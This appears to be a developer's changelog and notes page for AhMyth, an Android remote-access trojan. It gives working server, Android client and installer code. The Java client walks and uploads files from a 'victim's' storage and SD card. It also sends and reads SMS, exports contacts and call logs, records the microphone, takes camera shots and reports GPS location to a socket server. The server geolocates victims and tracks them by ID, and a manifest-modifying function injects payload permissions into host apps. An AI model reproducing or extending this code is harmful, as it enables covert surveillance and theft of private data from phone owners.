## Updated File Manager Feature (Server Side & Client Side)
> Now allows dynamic retrieval of the path to the Victim's Internal Storage rather than hardcoding it.
> This allows for more flexibility and robustness across devices.
>> Needs to be updated for requesting access to the external storage

<details>
    <summary>File Manager (Server Side + Client Side)</summary>
    <br>

### Server Side
- LabCtrl.js
```js
//-----------------------File Controller (fileManager.htm)------------------------
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    var fileManager = CONSTANTS.orders.fileManager;
    var externalStoragePathRequest = CONSTANTS.orders.externalStoragePathRequest; // New constant for external storage path request
    var sdCardPathRequest = CONSTANTS.orders.sdCardPathRequest; // New constant for SD card path request
    /* $('.menu .item').tab(); */ // reserved for when separate External and Removable Storage Tabs are introduced.

    // remove socket listener
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
        socket.removeAllListeners(externalStoragePathRequest);
        socket.removeAllListeners(sdCardPathRequest);
    });

    // limit the ng-repeat
    // infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    // send request to victim to get the external storage path
    $rootScope.Log('Requesting external storage path...');
    socket.emit(ORDER, {
        order: externalStoragePathRequest
    });

    // handle response with external storage path
    socket.on(externalStoragePathRequest, (data) => {
        externalStoragePath = data.path;
        if (externalStoragePath) {
            $rootScope.Log('Received external storage path: ' + externalStoragePath);
            // send request to victim to bring files using the received path
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: externalStoragePath // Use the received path from the client
            });
        } else {
            $rootScope.Log('Failed to get external storage path!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // send request to victim to get the external storage path
    $rootScope.Log('Requesting Removable Storage (SD Card) Path...');
    socket.emit(ORDER, {
        order: sdCardPathRequest
    });

    // handle response with removable storage path
    socket.on(sdCardPathRequest, (data) => {
        sdCardStoragePath = data.path;
        if (sdCardStoragePath) {
            $rootScope.Log('Received SD Card path: ' + sdCardStoragePath);
            // send request to victim to bring files using the received path
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: sdCardStoragePath // Handle SD card path
            });
        } else {
            $rootScope.Log('Failed to get SD Card path!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    socket.on(fileManager, (data) => {
        // response with file's binary
        if (data.file == true) {
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });

            // response with files list
        } else if (data.length != 0) {
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // when folder is clicked
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: '/' + file
            });
        }
    };

    // when save button is clicked
    // send request to bring file's binary
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, {
            order: fileManager,
            extra: 'dl',
            path: '/' + file
        });
    }
});
```

- Constants.js
```js
//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
  camera: 'x0000ca',
  fileManager: 'x0000fm',
  externalStoragePathRequest: 'getExternalStoragePath', // Part of the File Manager Feature
  sdCardPathRequest: 'getSDCardPath', // Part of the File Manager feature
  calls: 'x0000cl',
  sms: 'x0000sm',
  mic: 'x0000mc',
  location: 'x0000lm',
  contacts: 'x0000cn',
}
```

- FileManager.html
```html
<!--- Seperate Netsed Tabs for internal storage and external storage needed -->

<div class="ui segment {{load}} full" style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 400px;" id="parent">
    <div class="ui list" style="overflow-y:auto;white-space:nowrap;" infinite-scroll="increaseLimit()" infinite-scroll-container='"#parent"'>
        <div class="item" ng-repeat="file in files | limitTo:barLimit | orderBy:['-isDir','name']">

            <a ng-click="getFiles(file.path)" ng-if="file.isDir">
                <i class="folder icon"></i> {{file.name}}
            </a>
            <div class="ui label" ng-if="!file.isDir">
                <i class="file icon"></i> {{file.name}} &nbsp;&nbsp;
                <a ng-click="saveFile(file.path)"><i class="save red icon"></i></a>
            </div>

        </div>
    </div>
</div>
```

### Client Side
- FileManager.java
```java
package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class FileManager {

    public static JSONArray walk(String path) {
        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
        }

        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JSONObject parentObj = new JSONObject();
                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                values.put(parentObj);
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return values;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {
            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file", true);
                object.put("name", file.getName());
                object.put("buffer", data);
                IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    // New method to get external storage path
    public static String getExternalStoragePath() {
        return Environment.getExternalStorageDirectory().getAbsolutePath();
    }

    public static String getSDCardPath(Context context) {
        String sdCardPath = null;

        // Check for SD card path for SDK 19 and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            File[] externalDirs = ContextCompat.getExternalFilesDirs(context, null);
            for (File dir : externalDirs) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    if (dir != null && Environment.isExternalStorageRemovable(dir)) {
                        sdCardPath = dir.getAbsolutePath();
                        break;
                    }
                }
            }
        }

        // Check for SD card path for SDK 16 to 18
        if (sdCardPath == null) {
            String secondaryStorage = System.getenv("SECONDARY_STORAGE");
            if (secondaryStorage != null && !secondaryStorage.isEmpty()) {
                sdCardPath = secondaryStorage.split(":")[0];
            } else {
                String externalStorage = System.getenv("EXTERNAL_STORAGE");
                if (externalStorage != null && !externalStorage.isEmpty()) {
                    sdCardPath = externalStorage;
                }
            }
        }

        return sdCardPath;
    }
}
```

- ConnectionManager.java
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONException;
import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {

    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)
    {
        try {
            ConnectionManager.context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {

        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startAsync(context);
                        }
                    } catch (Exception ignored) {

                    }
                }
            });
        } else {
            startAsync(context);
        }
    }

    public static void sendReq() {
        try {

            if(ioSocket != null )
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order",order);
                        switch (order){
                            case "x0000ca":
                                if(data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "getExternalStoragePath": // New case for getting external storage path
                                getExternalStoragePath();
                                break;
                            case "getSDCardPath": // New case for SD card path
                                getSDCardPath();
                                break;
                            case "x0000sm":
                                if(data.getString("extra").equals("inbox")) {
                                    x0000sm(0, "inbox", null);
                                } else if(data.getString("extra").equals("outbox")) {
                                    x0000sm(0, "outbox", null);
                                } else if(data.getString("extra").equals("sendSMS")) {
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                }
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        }catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }
    }

    public static void x0000ca(int req){
        if(req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
                ioSocket.emit("x0000ca" ,cameraList );
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }

    // part of the FileManager Class for dynamic path handling
    public static void getExternalStoragePath() {
        String path = fm.getExternalStoragePath();
        JSONObject response = new JSONObject();
        try {
            response.put("path", path);
            ioSocket.emit("getExternalStoragePath", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // part of the FileManager Class for dynamic path handling
    public static void getSDCardPath() {
        String path = fm.getSDCardPath(context);
        JSONObject response = new JSONObject();
        try {
            response.put("path", path);
            ioSocket.emit("getSDCardPath", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static void x0000sm(int req, String type, String msg) {
        if (req == 0) {
            if ("inbox".equals(type)) {
                ioSocket.emit("x0000sm", SMSManager.getInboxSMSList());
            } else if ("outbox".equals(type)) {
                ioSocket.emit("x0000sm", SMSManager.getSentSMSList());
            }
        } else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(type, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl(){
        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
    }

    public static void x0000cn(){
        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc" , latitude+"   ,  "+longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);
        ioSocket.emit("x0000lm", location);
    }
}
```
</details>
<br></br>

## Code for Updated `>_ Listen` and `>_ Stop` functions + Client ID association
> Handles IPv4 + IPv6 IP addresses through geoip better + Generates unqiue client hashes and then maps them to unique 4-digit client numbers and then assigns them to client connections.
>> This currently only assigns client ID numbers, it needs to be further updated to allow users to re-connect to specfic clients.
>> This may evem be reworked with some client side ID association which would allow users to connect and reconnect to specifc clients on specific ports

<details>
    <summary>Client ID Association</summary>
    <br>

- Main Process
```js
const crypto = require('crypto');

let clientIdCounter = 1;
const hashToClientId = {};
const clientIdToHash = {};

initialize();

// Function to generate a unique 4-digit client ID
function generateClientId() {
  // Ensure client IDs are always 4 digits
  return String(clientIdCounter++).padStart(4, '0');
}

// Function to create a hash from victim's information
function generateHash(victimInfo) {
  return crypto.createHash('md5').update(victimInfo).digest('hex');
}

// Function to get a unique 4-digit client ID based on victim's information
function getUniqueClientId(victimInfo) {
  const hash = generateHash(victimInfo);
  if (!hashToClientId[hash]) {
    // If hash does not exist, assign a new client ID
    const clientId = generateClientId();
    hashToClientId[hash] = clientId;
    clientIdToHash[clientId] = hash;
  }
  return hashToClientId[hash];
}

/* existing window code for Splash and Main Screen */

// Function to check if the extracted victim IP is private or public
function isPrivateIP(ip) {
  return /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
}

// Global Object to track the listening status for each port
const listeningStatus = {};

// Global object to store client IDs by port
const clientIdsByPort = {};

// function to listen for incoming client connections
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  /* Initialize the client IDs array for the port 
  the victim connection was received on, if not already initialized. */
  if (!clientIdsByPort[port]) {
    clientIdsByPort[port] = [];
  }

  /* Allows the display of end directory files when using 
  the File Manager Feature in the Victim's Lab as well 
  as downloads from the victim device of upto 50mb */
  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  // retrieve and handle the connection as well as the victim information
  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;

    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
    var ip = address.remoteAddress;
    if (ip.includes(':')) {
      ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    /* Set the counry as null for every connection
    before obtaining the country of origin based on the victim's IP 
    to avoid conflictions */
    var country = null;

    // check if the extracted victim IP from an active connection is Private or Public
    if (isPrivateIP(ip)) {

      // If the IP is Private
      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
      event.reply('SocketIO:GeoIPError', warningMessage);
      event.sender.send('SocketIO:Log', warningMessage);
    } else {

      // if the IP is public 
      // Check the IP location
      var geo = geoip.lookup(ip);

      // handle exceptions
      if (geo) {
        if (geo.country) {
          country = geo.country.toLowerCase();
        } else {
          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
          event.reply('SocketIO:GeoIPError', warningMessage);
          event.sender.send('SocketIO:Log', warningMessage);
        }
      } else {
        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
        event.reply('SocketIO:GeoIPError', warningMessage);
        event.sender.send('SocketIO:Log', warningMessage);
      }
    }

    /* generate a unique client hash and map it to a 
    4 digit client number based on the victim's IP 
    and the remote address port */
    const victimInfo = `${ip}:${address.remotePort}`;
    const clientId = getUniqueClientId(victimInfo);

    // Store the client ID in the global object
    clientIdsByPort[port].push(clientId);

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id, clientId);

    /* existing code for notification window */
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    const sockets = IOs[port].sockets.sockets;
    const hasActiveConnections = Object.keys(sockets).length > 0;

    // Set the flag to indicate server-initiated disconnection if there are active connections
    if (hasActiveConnections) {
      IOs[port].sockets.serverInitiatedDisconnection = true;
    }

    IOs[port].close();
    IOs[port] = null;

    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectionMessage', clientIdsByPort[port]);
    } else {
      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
    }

    // Update listening status for the specific port
    listeningStatus[port] = false;

    // Clear the client IDs for the port 
    delete clientIdsByPort[port];
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});
```

- Render Process (AppCtrl)
```js
    /* existing code */

    /* existing code */

    /* existing code */

    /* existing code */

    ipcRenderer.on('SocketIO:ServerDisconnectionMessage', (event, clientIds) => {
        clientIds.forEach(clientId => {
          $appCtrl.Log(`[¡] Server Disconnected from Client: ${clientId}`, CONSTANTS.logStatus.INFO);
        });
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    /* existing code */
```

- Victim Module (Victim.js)
```js
 var Victim = function(socket, ip, port, country, manf, model, release, clientId) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.clientId = clientId
 };

 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
     }

     addVictim = (socket, ip, port, country, manf, model, release, id, clientId) => {
        var victim = new Victim(socket, ip, port, country, manf, model, release, clientId);
        this.victimList[id] = victim;
    }
    

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     rmVictim(id) {
         delete this.victimList[id];
     }

     getVictimList() {
         return this.victimList;
     }
 }

 module.exports = new Victims();
```

- index.html
```html
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table bg single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Client ID</th> <!-- New column for Client ID -->
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP</th>
                                <th>Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>
                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-bind="victim.clientId"></td> <!-- Display the Client ID -->
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
```
</details>
<br></br>

## `autoinstall_linux` code.
> - Thank you to [karma0x309](https://github.com/karma0x309) for the neat base layout of this script.
> - Thank you to [A-Unix](https://github.com/A-Unix) for the figlet banner code that gives the installer a stylish banner.
>> - Needs to be updated to install for *DNF (danified yum)* based distros and other RPM based distros if AhMyth supports these distros
>> - Needs to be updated to install for *zyppper* based distros and other openSUSE based distros if AhMyth supports these distros
>> - Needs to be updated to install for *pkg* based distors and other FreeBSD distros if AhMyth supports these distros
>> - Needs to be updated to install for *Portage* based distros and other Gentoo Linux based distros if AhMyth supports these distros
>> - Needs to be updated to install for *apk* based distros and other Alpine Linux based distros if AhMyth supports these distros
<details>
    <Summary>Code</Summary>

```bash
#!/bin/sh

# Create 3D banner for showcase
create_3d_banner() {
    
    # Reset color code
    reset_color="\033[0m"
    
    # Banner color code
    blue="\033[34m"
    
    # Banner text
    banner_text="   AhMyth"

    # Check if figlet and lolcat are installed
    if command -v figlet > /dev/null 2>&1; then
        # Use figlet to create ASCII art with mono9 font
        figlet_output=$(figlet -f mono9 "$banner_text")

        # Use lolcat to add color to the ASCII art
        banner_output=$(echo "$figlet_output")

        # Print the result
        echo "${blue}${banner_output}${reset_color}"
    else
        if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
            apt-get install -y figlet
        elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
            pacman -Sy figlet
            
            # Reset color code
            reset_color="\033[0m"
    
            # Banner color code
            blue="\033[34m"
    
            # Banner text
            banner_text="   AhMyth"
           
            # Use figlet to create ASCII art with mono9 font
            figlet_output=$(figlet -f mono9 "$banner_text")

            # Use lolcat to add color to the ASCII art
            banner_output=$(echo "$figlet_output")

            # Print the result
            echo "${blue}${banner_output}${reset_color}"

        fi
    fi
}

# Get the path to the script's directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# String color codes
reset_color="\033[0m"
red="\033[31m"
green="\033[32m"
yellow="\033[33m"

# Check package manager
if [ -x "$(command -v apt-get)" ]; then
    PACKAGE_MANAGER="apt-get"
elif [ -x "$(command -v pacman)" ]; then
    PACKAGE_MANAGER="pacman"
else
    echo "${red}[x] Unsupported package manager.\nThis script currently supports APT and Pacman-based systems.${reset_color}"
    exit 1
fi

java_install() {
    echo "${yellow}[i] Installing default JDK...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y default-jdk
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy jdk-openjdk
    fi
    echo "\n${green}[✔] Default JDK has been installed successfully.${reset_color}"
    sleep 2
}

nodejs_install() {
    echo "${yellow}[i] Installing Node.js...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y nodejs
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy nodejs
    fi
    echo "\n${green}[✔] Node.js has been installed successfully.${reset_color}"
    sleep 2
    clear
}

npm_install() {
    echo "${yellow}[i] Installing npm...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y npm
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy npm
    fi
    echo "\n${green}[✔] npm has been installed successfully.${reset_color}"
    sleep 2
    clear
}

git_install() {
    echo "${yellow}[i] Installing Git...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y git
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy git
    fi
    echo "\n${green}[✔] Git has been installed successfully.${reset_color}"
    sleep 2
    clear
}

create_system_shortcut() {
    # Create ahmyth file and grant executable permissions
    echo "${yellow}[i] Creating ahmyth file and granting executable permissions...${reset_color}\n"
    echo '#!/bin/sh' > ahmyth
    echo "if [ \"\$(id -u)\" = \"0\" ]; then" >> ahmyth
    echo "    npx electron \"$SCRIPT_DIR/app\" --no-sandbox start" >> ahmyth
    echo "else" >> ahmyth
    echo "    npm start --prefix \"$SCRIPT_DIR\"" >> ahmyth
    echo "fi" >> ahmyth
    chmod +x ahmyth
    sleep 2
    clear

    # Move ahmyth file to /usr/local/sbin
    echo "${yellow}[i] Moving ahmyth file to /usr/local/sbin...${reset_color}\n"
    if [ -d "/usr/local/sbin" ]; then
        mv ahmyth /usr/local/sbin
        echo "\n${green}[✔] ahmyth file has been moved to /usr/local/sbin."
    else
        echo "${red}[x] /usr/local/sbin directory not found! Unable to move ahmyth file.${reset_color}"
    fi
    sleep 2
    clear
}

# Check if user is root
if [ "$(id -u)" != "0" ]; then
    clear
    echo "${red}[x] This script must be run as root!${reset_color}" >&2
    exit 1
fi

# Run the function
clear
create_3d_banner
sleep 2

# Update and upgrade
clear
echo "${yellow}[i] Updating and Upgrading...${reset_color}\n"
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    apt-get update #&& apt-get upgrade -y
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    pacman -Syu --noconfirm
fi
echo "\n${green}[✔] Update and Upgrade done.${reset_color}"
sleep 2
clear

# Check if any version of java 8 through 21 is installed
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    if [ -z "$(dpkg -l | grep openjdk- | grep -E '8|9|10|11|12|13|14|15|16|17|18|19|20|21')" ]; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    if ! pacman -Qi jdk-openjdk >/dev/null 2>&1; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
fi

# Check if nodejs is installed
if [ -z "$(command -v node)" ]; then
    echo "${red}[x] Node.js is not installed!${reset_color}\n" >&2
    nodejs_install
fi

# Check if npm is installed
if [ -z "$(command -v npm)" ]; then
    echo "${red}[x] npm is not installed!${reset_color}\n" >&2
    npm_install
fi

# Check if git is installed
if [ -z "$(command -v git)" ]; then
    echo "${red}[x] Git is not installed!${reset_color}\n" >&2
    git_install
fi

# Check if ahmyth system shortcut exists, create it if not
if [ -z "$(command -v ahmyth)" ]; then
    echo "${red}[x] ahmyth system shortcut doesn't exist!${reset_color}\n"
    create_system_shortcut
fi

# Check if all dependencies are installed
if [ -x "$(command -v node)" ] && [ -x "$(command -v npm)" ] && [ -x "$(command -v git)" ] && [ -f "/usr/local/sbin/ahmyth" ]; then
    echo "${green}[✔] All Dependencies are Installed, Exiting.${reset_color}"
    exit 0
fi
```
</details>
<br></br>

## `"modifyManifest"` function.
> Needs to be updated to insert the camera feature permissions in the right place regardless if there are any `<uses-feature />` tags present.
>> This function currently contains a bug that makes a mess of certain Android Manifest files when formatting them after inserting payload permissions, service and receiver, I believe that it may be to do with Manifests that use the `<queries />` tag.
<details>
    <Summary>Code</Summary>

```javascript
    $appCtrl.modifyManifest = (data, callback) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        delayedLog('[★] Parsing the Android Manifest XML Data...');

        // Convert data to a string if it's not already a string
        if (typeof data !== 'string') {
            data = data.toString();
        }

        xml2js.parseString(data, {
            explicitArray: false
        }, (err, result) => {
            if (err) {
                const callbackErrors = [
                    '[x] Unable to Parse the Android Manifest XML Data!',
                    '[¡] Error written to "Parsing.log" on ' + CONSTANTS.logStatus.INFO,
                    logPath,
                ];
                writeErrorLog(err, 'Parsing.log');
                callback({
                    message: callbackErrors[0],
                    callbackErrors,
                });
                return;
            }

            const manifestObj = result.manifest;

            // Check if receiver and service properties are arrays
            if (!Array.isArray(manifestObj.application.receiver)) {
                manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver]: [];
            }

            if (!Array.isArray(manifestObj.application.service)) {
                manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service]: [];
            }

            // store existing permissions
            const existingPermissions = new Set();

            // Check if permissions already exist in the manifest
            if (manifestObj['uses-permission']) {
                if (!Array.isArray(manifestObj['uses-permission'])) {
                    manifestObj['uses-permission'] = [manifestObj['uses-permission']];
                }
                manifestObj['uses-permission'].forEach((permission) => {
                    existingPermissions.add(permission.$['android:name']);
                });
            } else {
                manifestObj['uses-permission'] = [];
            }

            // Check if features already exist in the manifest
            if (manifestObj['uses-feature']) {
                if (!Array.isArray(manifestObj['uses-feature'])) {
                    manifestObj['uses-feature'] = [manifestObj['uses-feature']];
                }
                manifestObj['uses-feature'].forEach((feature) => {
                    existingPermissions.add(feature.$['android:name']);
                });
            } else {
                manifestObj['uses-feature'] = [];
